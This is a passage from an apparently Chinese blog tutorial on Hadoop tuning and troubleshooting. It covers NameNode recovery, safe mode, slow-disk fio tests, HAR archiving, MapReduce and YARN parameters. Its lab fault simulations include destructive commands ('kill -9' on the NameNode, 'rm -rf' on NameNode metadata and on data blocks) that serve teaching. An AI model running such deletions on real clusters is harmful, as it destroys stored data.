当客户端所在的DataNode节点没有RAM_DISK时，则会写入客户端所在的DataNode节点的DISK磁盘，其余副本会写入其他节点的DISK磁盘</span></span><br><span class="line"><span class="comment"># 当客户端所在的DataNode有RAM_DISK，但“dfs.datanode.max.locked.memory”参数值未设置或者设置过小（小于“dfs.block.size”参数值）时，则会写入客户端所在的DataNode节点的DISK磁盘，其余副本会写入其他节点的DISK磁盘</span></span><br><span class="line"><span class="comment"># 是由于虚拟机的“max locked memory”为64KB，所以，如果参数配置过大，还会报出错误</span></span><br><span class="line"><span class="built_in">ulimit</span> -a</span><br></pre></td></tr></table></figure><h2 id="6、HDFS故障排除">6、HDFS故障排除</h2><h3 id="6-1-NameNode故障处理">6.1 NameNode故障处理</h3><p>NameNode进程挂了并且存储的数据也丢失了，如何恢复NameNode</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 故障模拟</span></span><br><span class="line"><span class="built_in">kill</span> -9 NameNode进程</span><br><span class="line"><span class="comment"># 删除NameNode存储的数据（/opt/module/hadoop-3.1.3/data/tmp/dfs/name）</span></span><br><span class="line">rm -rf /opt/module/hadoop-3.1.3/data/dfs/name/*</span><br><span class="line"></span><br><span class="line"><span class="comment"># 问题解决</span></span><br><span class="line"><span class="comment"># 拷贝SecondaryNameNode中数据到原NameNode存储数据目录</span></span><br><span class="line">scp -r atguigu@hadoop104:/opt/module/hadoop-3.1.3/data/dfs/namesecondary/* ./name/</span><br><span class="line"><span class="comment"># 重新启动NameNode</span></span><br><span class="line">hdfs --daemon start namenode</span><br></pre></td></tr></table></figure><h3 id="6-2-集群安全模式-磁盘修复">6.2 集群安全模式&amp;磁盘修复</h3><ul><li>**安全模式：**文件系统只接受读数据请求，而不接受删除、修改等变更请求</li><li>进入安全模式场景<ul><li>NameNode在加载镜像文件和编辑日志期间处于安全模式；</li><li>NameNode再接收DataNode注册时，处于安全模式</li></ul></li></ul><p><strong>退出安全模式条件</strong></p><ul><li>dfs.namenode.safemode.min.datanodes:最小可用datanode数量，默认0</li><li>dfs.namenode.safemode.threshold-pct:副本数达到最小要求的block占系统总block数的百分比，默认0.999f。（只允许丢一个块）</li><li>dfs.namenode.safemode.extension:稳定时间，默认值30000毫秒，即30秒</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 集群处于安全模式，不能执行重要操作（写操作）。集群启动完成后，自动退出安全模式</span></span><br><span class="line">bin/hdfs dfsadmin -safemode get  （功能描述：查看安全模式状态）</span><br><span class="line">bin/hdfs dfsadmin -safemode enter （功能描述：进入安全模式状态）</span><br><span class="line">bin/hdfs dfsadmin -safemode leave  （功能描述：离开安全模式状态）</span><br><span class="line">bin/hdfs dfsadmin -safemode <span class="built_in">wait</span>  （功能描述：等待安全模式状态）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ========================案例1：启动集群进入安全模式===============</span></span><br><span class="line"><span class="comment"># 集群启动后，立即来到集群上删除数据，提示集群处于安全模式</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==================案例2：磁盘修复===========================</span></span><br><span class="line"><span class="comment"># 需求：数据块损坏，进入安全模式，如何处理</span></span><br><span class="line"><span class="comment"># 分别进入hadoop102、hadoop103、hadoop104的/opt/module/hadoop-3.1.3/data/dfs/data/current/BP-1015489500-192.168.10.102-1611909480872/current/finalized/subdir0/subdir0目录，统一删除某2个块信息</span></span><br><span class="line">rm -rf blk_1073741847 blk_1073741847_1023.meta</span><br><span class="line">rm -rf blk_1073741865 blk_1073741865_1042.meta</span><br><span class="line"><span class="comment"># 说明：hadoop103/hadoop104重复执行以上命令</span></span><br><span class="line"><span class="comment"># 重新启动集群,因为默认是6小时才汇报注册一次，删了集群一下子是不会有反应的</span></span><br><span class="line">myhadoop.sh stop</span><br><span class="line">myhadoop.sh start</span><br><span class="line"><span class="comment"># 观察http://hadoop102:9870/dfshealth.html#tab-overview</span></span><br><span class="line"><span class="comment"># 说明：安全模式已经打开，块的数量没有达到要求</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 离开安全模式</span></span><br><span class="line">hdfs dfsadmin -safemode get</span><br><span class="line">hdfs dfsadmin -safemode leave</span><br><span class="line"><span class="comment"># 观察http://hadoop102:9870/dfshealth.html#tab-overview</span></span><br><span class="line"><span class="comment"># 或者将元数据删除那么就会自动退出安全模式</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ===================案例3：模拟等待安全模式================</span></span><br><span class="line"><span class="comment"># 查看当前模式</span></span><br><span class="line">hdfs dfsadmin -safemode get</span><br><span class="line"><span class="comment"># 先进入安全模式</span></span><br><span class="line">bin/hdfs dfsadmin -safemode enter</span><br><span class="line"><span class="comment"># 创建并执行下面的脚本，在/opt/module/hadoop-3.1.3路径上，编辑一个脚本safemode.sh</span></span><br><span class="line"><span class="comment"># 一离开安全模式就立刻上传文件</span></span><br><span class="line">vim safemode.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">hdfs dfsadmin -safemode <span class="built_in">wait</span></span><br><span class="line">hdfs dfs -put /opt/module/hadoop-3.1.3/README.txt /</span><br><span class="line"></span><br><span class="line">chmod 777 safemode.sh</span><br><span class="line">./safemode.sh </span><br><span class="line"><span class="comment"># 再打开一个窗口，执行</span></span><br><span class="line">bin/hdfs dfsadmin -safemode leave</span><br></pre></td></tr></table></figure><h3 id="6-3-慢磁盘监控">6.3 慢磁盘监控</h3><p>&quot;慢磁盘&quot;指的时写入数据非常慢的一类磁盘。其实慢性磁盘并不少见，当机器运行时间长了，上面跑的任务多了，磁盘的读写性能自然会退化，严重时就会出现写入数据延时的问题。如何发现慢磁盘？正常在HDFS上创建一个目录，只需要不到1s的时间。如果你发现创建目录超过1分钟及以上，而且这个现象并不是每次都有。只是偶尔慢了一下，就很有可能存在慢磁盘。可以采用如下方法找出是哪块磁盘慢：</p><ul><li>通过心跳未联系时间，一般出现慢磁盘现象，会影响到DataNode与NameNode之间的心跳。<strong>正常情况心跳时间间隔是3s。超过3s说明有异常</strong></li><li>fio命令，测试磁盘的读写性能</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install -y fio</span><br><span class="line"><span class="comment"># ====================顺序读测试=====================</span></span><br><span class="line">sudo fio -filename=/home/atguigu/test.log -direct=1 -iodepth 1 -thread -rw=<span class="built_in">read</span> -ioengine=psync -bs=16k -size=2G -numjobs=10 -runtime=60 -group_reporting -name=test_r</span><br><span class="line"></span><br><span class="line"><span class="comment"># ====================顺序写测试=====================</span></span><br><span class="line">sudo fio -filename=/home/atguigu/test.log -direct=1 -iodepth 1 -thread -rw=write -ioengine=psync -bs=16k -size=2G -numjobs=10 -runtime=60 -group_reporting -name=test_w</span><br><span class="line"></span><br><span class="line"><span class="comment"># ====================随机写测试=======================</span></span><br><span class="line">sudo fio -filename=/home/atguigu/test.log -direct=1 -iodepth 1 -thread -rw=randwrite -ioengine=psync -bs=16k -size=2G -numjobs=10 -runtime=60 -group_reporting -name=test_randw</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===================混合随机读写=======================</span></span><br><span class="line">sudo fio -filename=/home/atguigu/test.log -direct=1 -iodepth 1 -thread -rw=randrw -rwmixread=70 -ioengine=psync -bs=16k -size=2G -numjobs=10 -runtime=60 -group_reporting -name=test_r_w -ioscheduler=noop</span><br></pre></td></tr></table></figure><h3 id="6-4-小文件归档">6.4 小文件归档</h3><p><strong>HDFS存储小文件弊端</strong></p><p>每个文件均按块存储，每个块的元数据存储在NameNode的内存中，因此HDFS存储小文件会非常低效。因为大量的小文件会耗尽NameNode中的大部分内存。但注意，存储小文件所需要的磁盘容量和数据块的大小无关。例如，一个1MB的文件设置为128MB的块存储，实际使用的是1MB的磁盘空间，而不是128MB</p><p><strong>解决存储小文件办法之一</strong></p><p>HDFS存档文件或HAR文件，是一个更高效的文件存档工具，它将文件存入HDFS块，在减少NameNode内存使用的同时，允许对文件进行透明的访问。具体说来，HDFS存档文件对内还是一个一个独立文件，对NameNode而言却是一个整体，减少了NameNode的内存</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 案例实操</span></span><br><span class="line"><span class="comment"># 需要启动YARN进程</span></span><br><span class="line">start-yarn.sh</span><br><span class="line"><span class="comment"># 归档文件</span></span><br><span class="line"><span class="comment"># 把/input目录里面的所有文件归档成一个叫input.har的归档文件，并把归档后文件存储到/output路径下</span></span><br><span class="line">hadoop archive -archiveName input.har -p  /input   /output</span><br><span class="line"><span class="comment"># 查看归档</span></span><br><span class="line">hadoop fs -ls /output/input.har</span><br><span class="line">hadoop fs -ls har:///output/input.har</span><br><span class="line"><span class="comment"># 解归档文件</span></span><br><span class="line">hadoop fs -cp har:///output/input.har/* /</span><br></pre></td></tr></table></figure><h2 id="7、MapReduce生产经验-重点">7、MapReduce生产经验(重点)</h2><h3 id="7-1-MapReduce慢的原因">7.1 MapReduce慢的原因</h3><p>apReduce程序效率的瓶颈在于两点：</p><ul><li><p>计算机性能</p><p>CPU、内存、磁盘、网络</p></li><li><p><strong>I/O</strong>操作优化</p><ul><li>数据倾斜</li><li>Map运行时间太长，导致Reduce等待过久</li><li>小文件过多</li></ul></li></ul><h3 id="7-2-MapReduce常用调优参数">7.2 MapReduce常用调优参数</h3><p><img src="http://qnypic.shawncoding.top/blog/202401251330941.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202401251330942.png" alt></p><h3 id="7-3-MapReduce数据倾斜问题">7.3 MapReduce数据倾斜问题</h3><ul><li>数据频率倾斜——某一个区域的数据量要远远大于其他区域</li><li>数据大小倾斜——部分记录的大小远远大于平均值</li></ul><p><strong>减少数据倾斜的方法</strong></p><ul><li>首先检查是否空值过多造成的数据倾斜，生产环境，可以直接过滤掉空值；如果想保留空值，就自定义分区，将空值加随机数打散。最后再二次聚合</li><li>能在map阶段提前处理，最好先在Map阶段处理。如：Combiner、MapJoin</li><li>设置多个reduce个数</li></ul><h2 id="8、Yarn生产经验">8、Yarn生产经验</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># =========================Resourcemanager相关================</span></span><br><span class="line"><span class="comment"># ResourceManager处理调度器请求的线程数量</span></span><br><span class="line">yarn.resourcemanager.scheduler.client.thread-count</span><br><span class="line"><span class="comment"># 配置调度器</span></span><br><span class="line">yarn.resourcemanager.scheduler.class</span><br><span class="line"></span><br><span class="line"><span class="comment"># =========================Nodemanager相关===================</span></span><br><span class="line"><span class="comment"># NodeManager使用内存数</span></span><br><span class="line">yarn.nodemanager.resource.memory-mb</span><br><span class="line"><span class="comment"># NodeManager为系统保留多少内存，和上一个参数二者取一即可</span></span><br><span class="line">yarn.nodemanager.resource.system-reserved-memory-mb</span><br><span class="line"><span class="comment"># NodeManager使用CPU核数</span></span><br><span class="line">yarn.nodemanager.resource.cpu-vcores</span><br><span class="line"><span class="comment"># 是否将虚拟核数当作CPU核数</span></span><br><span class="line">yarn.nodemanager.resource.count-logical-processors-as-cores</span><br><span class="line"><span class="comment"># 虚拟核数和物理核数乘数，例如：4核8线程，该参数就应设为2</span></span><br><span class="line">yarn.nodemanager.resource.pcores-vcores-multiplier</span><br><span class="line"><span class="comment"># 是否让yarn自己检测硬件进行配置</span></span><br><span class="line">yarn.nodemanager.resource.detect-hardware-capabilities</span><br><span class="line"><span class="comment"># 是否开启物理内存检查限制container</span></span><br><span class="line">yarn.nodemanager.pmem-check-enabled</span><br><span class="line"><span class="comment"># 是否开启虚拟内存检查限制container</span></span><br><span class="line">yarn.nodemanager.vmem-check-enabled</span><br><span class="line"><span class="comment"># 虚拟内存物理内存比例</span></span><br><span class="line">yarn.nodemanager.vmem-pmem-ratio      </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># =======================Container容器相关========================</span></span><br><span class="line"><span class="comment"># 容器最小内存</span></span><br><span class="line">yarn.scheduler.minimum-allocation-mb</span><br><span class="line"><span class="comment"># 容器最大内存</span></span><br><span class="line">yarn.scheduler.maximum-allocation-mb</span><br><span class="line"><span class="comment"># 容器最小核数</span></span><br><span class="line">yarn.scheduler.minimum-allocation-vcores</span><br><span class="line"><span class="comment"># 容器最大核数</span></span><br><span class="line">yarn.scheduler.maximum-allocation-vcores</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调度器详见yarn知识点</span></span><br></pre></td></tr></table></figure><h2 id="9、Hadoop综合调优">9、Hadoop综合调优</h2><h3 id="9-1-Hadoop小文件优化方法">9.1 Hadoop小文件优化方法</h3><p>HDFS上每个文件都要在NameNode上创建对应的元数据，这个元数据的大小约为150byte，这样当小文件比较多的时候，就会产生很多的元数据文件，**一方面会大量占用NameNode的内存空间，另一方面就是元数据文件过多，使得寻址索引速度变慢。**小文件过多，在进行MR计算时，会生成过多切片，需要启动过多的MapTask。每个MapTask处理的数据量小，<strong>导致MapTask的处理时间比启动时间还小，白白消耗资源</strong>。</p><p>Hadoop小文件解决方案有几种方案：</p><ul><li><strong>在数据采集的时候，就将小文件或小批数据合成大文件再上传HDFS（数据源头）</strong></li><li><strong>Hadoop Archive（存储方向）</strong>：是一个高效的将小文件放入HDFS块中的文件存档工具，能够将多个小文件打包成一个HAR文件，从而达到减少NameNode的内存使用</li><li>CombineTextInputFormat（计算方向）：CombineTextInputFormat用于将多个小文件在切片过程中生成一个单独的切片或者少量的切片</li><li>开启uber模式，实现JVM重用（计算方向）：默认情况下，每个Task任务都需要启动一个JVM来运行，如果Task任务计算的数据量很小，我们可以让同一个Job的多个Task运行在一个JVM中，不必为每个Task都开启一个JVM</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 未开启uber模式，在/input路径上上传多个小文件并执行wordcount程序</span></span><br><span class="line">hadoop jar share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount /input /output2</span><br><span class="line"><span class="comment"># 观察控制台,观察http://hadoop103:8088/cluster</span></span><br><span class="line"><span class="comment"># 开启uber模式，在mapred-site.xml中添加如下配置</span></span><br><span class="line">&lt;!--  开启uber模式，默认关闭 --&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;mapreduce.job.ubertask.enable&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;<span class="literal">true</span>&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--mapreduce框架会认为是小任务的条件--&gt;</span><br><span class="line">&lt;!-- uber模式中最大的mapTask数量，可向下修改  --&gt; </span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;mapreduce.job.ubertask.maxmaps&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;9&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;!-- uber模式中最大的reduce数量，可向下修改 --&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;mapreduce.job.ubertask.maxreduces&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;1&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line">&lt;!-- uber模式中最大的输入数据量，默认使用dfs.blocksize 的值，可向下修改 --&gt;</span><br><span class="line">&lt;property&gt;</span><br><span class="line">    &lt;name&gt;mapreduce.job.ubertask.maxbytes&lt;/name&gt;</span><br><span class="line">    &lt;value&gt;&lt;/value&gt;</span><br><span class="line">&lt;/property&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 分发配置</span></span><br><span class="line">xsync mapred-site.xml</span><br><span class="line"><span class="comment"># 再次执行wordcount程序,已经观察</span></span><br></pre></td></tr></table></figure><h3 id="9-2-测试MapReduce计算性能">9.2 测试MapReduce计算性能</h3><p>使用Sort程序评测MapReduce(注：一个虚拟机不超过150G磁盘尽量不要执行这段代码)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用RandomWriter来产生随机数，每个节点运行10个Map任务，每个Map产生大约1G大小的二进制随机数</span></span><br><span class="line">hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar randomwriter random-data</span><br><span class="line"><span class="comment"># 执行Sort程序</span></span><br><span class="line">hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar sort random-data sorted-data</span><br><span class="line"><span class="comment"># 验证数据是否真正排好序了</span></span><br><span class="line">hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-client-jobclient-3.1.3-tests.jar testmapredsort -sortInput random-data -sortOutput sorted-data</span><br></pre></td></tr></table></figure><h3 id="9-3-企业开发场景案例">9.3 企业开发场景案例</h3><p>需求：从1G数据中，统计每个单词出现次数。服务器3台，每台配置4G内存，4核CPU，4线程。需求分析：1G / 128m = 8个MapTask；1个ReduceTask；1个mrAppMaster平均每个节点运行10个 / 3台 ≈ 3个任务（4 3 3）</p><p><strong>HDFS参数调优</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改：hadoop-env.sh</span></span><br><span class="line"><span class="built_in">export</span> HDFS_NAMENODE_OPTS=<span class="string">"-Dhadoop.security.logger=INFO,RFAS -Xmx1024m"</span></span><br><span class="line"><span class="built_in">export</span> HDFS_DATANODE_OPTS=<span class="string">"-Dhadoop.security.logger=ERROR,RFAS -Xmx1024m"</span></span><br></pre></td></tr></table></figure><p>分别修改hdfs-site.xml和修改core-site.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- NameNode有一个工作线程池，默认值是10 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.handler.count<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>21<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 配置垃圾回收时间为60分钟 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.trash.interval<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>60<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure><p>分发配置：<code>xsync hadoop-env.sh hdfs-site.xml core-site.xml</code></p><p><strong>MapReduce参数调优</strong></p><p>修改mapred-site.xml，修改完后分发</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 环形缓冲区大小，默认100m --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.task.io.sort.mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>100<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 环形缓冲区溢写阈值，默认0.8 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.map.sort.spill.percent<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>0.80<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- merge合并次数，默认10个 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.task.io.sort.factor<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>10<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- maptask内存，默认1g； maptask堆内存大小默认和该值大小一致mapreduce.map.java.opts --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.map.memory.mb<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">description</span>&gt;</span>The amount of memory to request from the scheduler for each    map task. If this is not specified or is non-positive, it is inferred from mapreduce.map.java.opts and mapreduce.job.heap.memory-mb.ratio. If java-opts are also not specified, we set it to 1024.</span><br><span class="line">  <span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- matask的CPU核数，默认1个 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.map.cpu.vcores<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>1<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- matask异常重试次数，默认4次 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.map.maxattempts<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>4<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 每个Reduce去Map中拉取数据的并行数。默认值是5 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.reduce.shuffle.parallelcopies<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>5<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Buffer大小占Reduce可用内存的比例，默认值0.7 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.reduce.shuffle.input.buffer.percent<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">value</span>&gt;</span>0.70<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 